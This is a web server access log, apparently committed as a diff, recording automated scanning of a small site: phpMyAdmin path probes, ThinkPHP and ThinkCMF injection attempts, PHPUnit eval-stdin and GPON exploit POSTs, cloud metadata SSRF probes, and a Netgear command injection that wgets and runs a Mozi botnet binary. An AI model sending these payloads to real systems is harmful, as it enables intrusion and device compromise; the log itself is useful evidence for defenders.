+[0mGET /phpMyAdmin-2.6.4-pl2/ [33m404 [0m0.774 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.4-pl3/ [33m404 [0m0.744 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.4-pl4/ [33m404 [0m1.256 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.4/ [33m404 [0m0.786 ms - 993[0m
+[0mGET /phpMyAdmin-2.7.0-beta1/ [33m404 [0m0.744 ms - 993[0m
+[0mGET /phpMyAdmin-2.7.0-rc1/ [33m404 [0m0.772 ms - 993[0m
+[0mGET /phpMyAdmin-2.7.0-pl1/ [33m404 [0m0.759 ms - 993[0m
+[0mGET /phpMyAdmin-2.7.0-pl2/ [33m404 [0m0.755 ms - 993[0m
+[0mGET /phpMyAdmin-2.7.0/ [33m404 [0m0.753 ms - 993[0m
+[0mGET /phpMyAdmin-2.8.0-beta1/ [33m404 [0m0.771 ms - 993[0m
+[0mGET /phpMyAdmin-2.8.0-rc1/ [33m404 [0m0.760 ms - 993[0m
+[0mGET /phpMyAdmin-2.8.0-rc2/ [33m404 [0m0.782 ms - 993[0m
+[0mGET /phpMyAdmin-2.8.0/ [33m404 [0m0.784 ms - 993[0m
+[0mGET /phpMyAdmin-2.8.0.1/ [33m404 [0m0.810 ms - 993[0m
+[0mGET /phpMyAdmin-2.8.0.2/ [33m404 [0m1.167 ms - 993[0m
+[0mGET /phpMyAdmin-2.8.0.3/ [33m404 [0m0.739 ms - 993[0m
+[0mGET /phpMyAdmin-2.8.0.4/ [33m404 [0m0.737 ms - 993[0m
+[0mGET /phpMyAdmin-2.8.1-rc1/ [33m404 [0m0.772 ms - 993[0m
+[0mGET /phpMyAdmin-2.8.1/ [33m404 [0m0.753 ms - 993[0m
+[0mGET /phpMyAdmin-2.8.2/ [33m404 [0m0.750 ms - 993[0m
+[0mGET /sqlmanager/ [33m404 [0m0.803 ms - 993[0m
+[0mGET /mysqlmanager/ [33m404 [0m0.754 ms - 993[0m
+[0mGET /p/m/a/ [33m404 [0m0.747 ms - 993[0m
+[0mGET /PMA2005/ [33m404 [0m0.749 ms - 993[0m
+[0mGET /pma2005/ [33m404 [0m0.781 ms - 993[0m
+[0mGET /phpmanager/ [33m404 [0m0.774 ms - 993[0m
+[0mGET /php-myadmin/ [33m404 [0m0.738 ms - 993[0m
+[0mGET /phpmy-admin/ [33m404 [0m1.111 ms - 993[0m
+[0mGET /webadmin/ [33m404 [0m0.738 ms - 993[0m
+[0mGET /sqlweb/ [33m404 [0m0.776 ms - 993[0m
+[0mGET /websql/ [33m404 [0m0.768 ms - 993[0m
+[0mGET /webdb/ [33m404 [0m0.764 ms - 993[0m
+[0mGET /mysqladmin/ [33m404 [0m0.759 ms - 993[0m
+[0mGET /mysql-admin/ [33m404 [0m0.757 ms - 993[0m
+[0mGET / [32m200 [0m0.628 ms - 207[0m
+[0mGET /stylesheets/style.css [32m200 [0m0.744 ms - 14750[0m
+[0mGET /favicon.ico [33m404 [0m0.787 ms - 993[0m
+[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.736 ms - 993[0m
+[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.598 ms - 207[0m
+[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.639 ms - 207[0m
+[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m1.063 ms - 993[0m
+[0mGET http://example.com/ [32m200 [0m0.606 ms - 207[0m
+[0mGET http://169.254.169.254/ [32m200 [0m0.622 ms - 207[0m
+[0mGET http://[::ffff:a9fe:a9fe]/ [32m200 [0m0.643 ms - 207[0m
+[0mGET http://169.254.169.254/latest/dynamic/instance-identity/document [33m404 [0m0.749 ms - 993[0m
+[0mGET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document [33m404 [0m0.741 ms - 993[0m
+[0mGET / [32m200 [0m0.605 ms - 207[0m
+[0mGET / [32m200 [0m0.624 ms - 207[0m
+[0mGET / [32m200 [0m0.666 ms - 207[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.758 ms - 993[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.759 ms - 993[0m
+[0mGET / [32m200 [0m0.696 ms - 207[0m
+[0mGET /a2billing/admin/Public/index.php [33m404 [0m0.750 ms - 993[0m
+[0mGET / [32m200 [0m0.939 ms - 207[0m
+[0mGET / [32m200 [0m0.656 ms - 207[0m
+[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.982 ms - 993[0m
+[0mGET /serverinfo/HtmlAdaptor?action=displayServerInfos [33m404 [0m0.745 ms - 993[0m
+[0mGET http://example.com/ [32m200 [0m0.631 ms - 207[0m
+[0mGET http://169.254.169.254/ [32m200 [0m0.605 ms - 207[0m
+[0mGET http://[::ffff:a9fe:a9fe]/ [32m200 [0m0.623 ms - 207[0m
+[0mGET http://169.254.169.254/latest/dynamic/instance-identity/document [33m404 [0m0.786 ms - 993[0m
+[0mGET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document [33m404 [0m0.777 ms - 993[0m
+[0mGET / [32m200 [0m0.627 ms - 207[0m
+[0mGET / [32m200 [0m0.621 ms - 207[0m
+[0mGET / [32m200 [0m0.681 ms - 207[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.744 ms - 993[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.784 ms - 993[0m
+[0mGET /phpmyadmin/index.php?lang=en [33m404 [0m0.710 ms - 993[0m
+[0mGET http://45.76.45.209/ [32m200 [0m0.649 ms - 207[0m
+[0mGET /manager/html [33m404 [0m0.754 ms - 993[0m
+[0mGET / [32m200 [0m0.667 ms - 207[0m
+[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.590 ms - 207[0m
+[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.577 ms - 993[0m
+[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.473 ms - 207[0m
+[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.531 ms - 993[0m
+[0mGET / [32m200 [0m0.639 ms - 207[0m
+[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.615 ms - 993[0m
+[0mGET http://example.com/ [32m200 [0m0.658 ms - 207[0m
+[0mGET http://169.254.169.254/ [32m200 [0m0.638 ms - 207[0m
+[0mGET http://[::ffff:a9fe:a9fe]/ [32m200 [0m0.617 ms - 207[0m
+[0mGET http://169.254.169.254/latest/dynamic/instance-identity/document [33m404 [0m0.808 ms - 993[0m
+[0mGET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document [33m404 [0m0.752 ms - 993[0m
+[0mGET / [32m200 [0m0.672 ms - 207[0m
+[0mGET / [32m200 [0m0.622 ms - 207[0m
+[0mGET / [32m200 [0m0.602 ms - 207[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.737 ms - 993[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.753 ms - 993[0m
+[0mGET /TP/public/index.php [33m404 [0m0.735 ms - 993[0m
+[0mGET /TP/index.php [33m404 [0m0.790 ms - 993[0m
+[0mGET /thinkphp/html/public/index.php [33m404 [0m0.771 ms - 993[0m
+[0mGET /html/public/index.php [33m404 [0m0.756 ms - 993[0m
+[0mGET /public/index.php [33m404 [0m0.736 ms - 993[0m
+[0mGET /TP/html/public/index.php [33m404 [0m1.207 ms - 993[0m
+[0mGET /elrekt.php [33m404 [0m0.760 ms - 993[0m
+[0mGET /index.php [33m404 [0m0.812 ms - 993[0m
+[0mGET / [32m200 [0m0.638 ms - 207[0m
+[0mGET / [32m200 [0m0.682 ms - 207[0m
+[0mGET / [32m200 [0m0.642 ms - 207[0m
+[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.851 ms - 993[0m
+[0mGET / [32m200 [0m0.601 ms - 207[0m
+[0mGET / [32m200 [0m0.722 ms - 207[0m
+[0mGET /TP/public/index.php [33m404 [0m0.776 ms - 993[0m
+[0mGET /TP/index.php [33m404 [0m0.732 ms - 993[0m
+[0mGET /thinkphp/html/public/index.php [33m404 [0m0.742 ms - 993[0m
+[0mGET /html/public/index.php [33m404 [0m0.721 ms - 993[0m
+[0mGET /public/index.php [33m404 [0m0.812 ms - 993[0m
+[0mGET /TP/html/public/index.php [33m404 [0m0.740 ms - 993[0m
+[0mGET /elrekt.php [33m404 [0m0.736 ms - 993[0m
+[0mGET /index.php [33m404 [0m0.764 ms - 993[0m
+[0mGET / [32m200 [0m0.644 ms - 207[0m
+[0mGET / [32m200 [0m0.615 ms - 207[0m
+[0mOPTIONS / [32m200 [0m0.629 ms - 8[0m
+[0mGET / [32m200 [0m0.675 ms - 207[0m
+[0mGET / [32m200 [0m0.635 ms - 207[0m
+[0mGET / [32m200 [0m0.618 ms - 207[0m
+[0mHEAD /robots.txt [33m404 [0m0.723 ms - 993[0m
+[0mGET / [32m200 [0m0.689 ms - 207[0m
+[0mGET http://example.com/ [32m200 [0m0.631 ms - 207[0m
+[0mGET http://169.254.169.254/ [32m200 [0m0.639 ms - 207[0m
+[0mGET http://[::ffff:a9fe:a9fe]/ [32m200 [0m0.624 ms - 207[0m
+[0mGET http://169.254.169.254/latest/dynamic/instance-identity/document [33m404 [0m1.221 ms - 993[0m
+[0mGET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document [33m404 [0m0.807 ms - 993[0m
+[0mGET / [32m200 [0m0.667 ms - 207[0m
+[0mGET / [32m200 [0m0.574 ms - 207[0m
+[0mGET / [32m200 [0m0.686 ms - 207[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.713 ms - 993[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.759 ms - 993[0m
+[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.725 ms - 993[0m
+[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.628 ms - 207[0m
+[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m3.587 ms - 207[0m
+[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.730 ms - 993[0m
+[0mGET /phpmyadmin [33m404 [0m0.772 ms - 993[0m
+[0mGET /phpmyadmin [33m404 [0m0.813 ms - 993[0m
+[0mGET / [32m200 [0m1.044 ms - 207[0m
+[0mGET / [32m200 [0m0.692 ms - 207[0m
+[0mGET / [32m200 [0m0.610 ms - 207[0m
+[0mGET / [32m200 [0m0.693 ms - 207[0m
+[0mGET http://example.com/ [32m200 [0m0.632 ms - 207[0m
+[0mGET http://169.254.169.254/ [32m200 [0m0.628 ms - 207[0m
+[0mGET http://[::ffff:a9fe:a9fe]/ [32m200 [0m0.673 ms - 207[0m
+[0mGET http://169.254.169.254/latest/dynamic/instance-identity/document [33m404 [0m0.758 ms - 993[0m
+[0mGET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document [33m404 [0m0.762 ms - 993[0m
+[0mGET / [32m200 [0m0.640 ms - 207[0m
+[0mGET / [32m200 [0m0.651 ms - 207[0m
+[0mGET / [32m200 [0m0.627 ms - 207[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.733 ms - 993[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m1.150 ms - 993[0m
+[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.716 ms - 993[0m
+[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.626 ms - 207[0m
+[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.613 ms - 207[0m
+[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.719 ms - 993[0m
+[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.762 ms - 993[0m
+[0mGET / [32m200 [0m0.692 ms - 207[0m
+[0mOPTIONS / [32m200 [0m0.247 ms - 8[0m
+[0mHEAD / [32m200 [0m0.663 ms - 207[0m
+[0mGET / [32m200 [0m0.650 ms - 207[0m
+[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.763 ms - 993[0m
+[0mGET / [32m200 [0m0.626 ms - 207[0m
+[0mGET /stylesheets/style.css [32m200 [0m0.544 ms - 14750[0m
+[0mGET /favicon.ico [33m404 [0m0.744 ms - 993[0m
+[0mGET / [36m304 [0m1.041 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.353 ms - -[0m
+[0mGET /favicon.ico [33m404 [0m0.739 ms - 993[0m
+[0mGET / [36m304 [0m0.626 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.333 ms - -[0m
